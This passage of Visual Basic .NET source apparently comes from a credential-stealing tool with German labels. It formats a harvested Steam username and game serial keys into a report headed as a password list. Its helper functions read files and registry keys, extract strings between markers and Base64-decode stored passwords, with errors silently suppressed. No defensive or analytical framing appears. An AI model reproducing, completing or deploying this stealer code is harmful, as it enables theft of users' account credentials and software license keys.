            Form1.txtpws.Text &= ("***************** Steam Benutzername *************" & vbNewLine)
            Form1.txtpws.Text &= ("**************************************************" & vbNewLine & steam & vbNewLine & vbNewLine)

            Form1.txtpws.Text &= ("**************************************************" & vbNewLine)
            Form1.txtpws.Text &= ("******************* Game Serials *****************" & vbNewLine)
            Form1.txtpws.Text &= ("**************************************************" & vbNewLine & Seriallist & vbNewLine & vbNewLine)

            Form1.txtpws.Text &= ("==================================================" & vbNewLine)
            Form1.txtpws.Text &= ("================== Ende der Liste ================" & vbNewLine)
            Form1.txtpws.Text &= ("==================================================" & vbNewLine & vbNewLine & vbNewLine & vbNewLine & vbNewLine)
        Catch
        End Try
    End Sub
#End Region

#Region "Sonstige dinge"
    Function ReadFile(ByVal sFile As String) As String
        On Error Resume Next
        Dim OpenFile As New System.IO.StreamReader(sFile)
        ReadFile = OpenFile.ReadToEnd.ToString
    End Function

    Function Cut(ByVal sInhalt As String, ByVal sText As String, ByVal sText2 As String) As String
        On Error Resume Next
        Dim c() As String
        Dim c2() As String
        c = Split(sInhalt, sText)
        c2 = Split(c(1), sText2)
        Cut = c2(0)
    End Function

    Function RegRead(ByVal hKey As String) As String
        Dim wshShell As Object = CreateObject("WScript.Shell")
        On Error Resume Next
        RegRead = wshShell.RegRead(hKey)
    End Function

    Public Function ReadLine(ByVal filename As String, _
    ByVal line As Integer) As String
        Try
            Dim lines As String() = My.Computer.FileSystem.ReadAllText( _
              filename, System.Text.Encoding.Default).Split(vbCrLf)
            If line > 0 Then
                Return lines(line - 1)
            ElseIf line < 0 Then
                Return lines(lines.Length + line - 1)
            Else
                Return ""
            End If
        Catch ex As Exception
            Return ""
        End Try
    End Function

    Public Function FromBase64(ByVal passwort As String) As String
        Dim nBytes() As Byte = System.Convert.FromBase64String(passwort)
        FromBase64 = System.Text.Encoding.Default.GetString(nBytes)
    End Function
#End Region
End Module
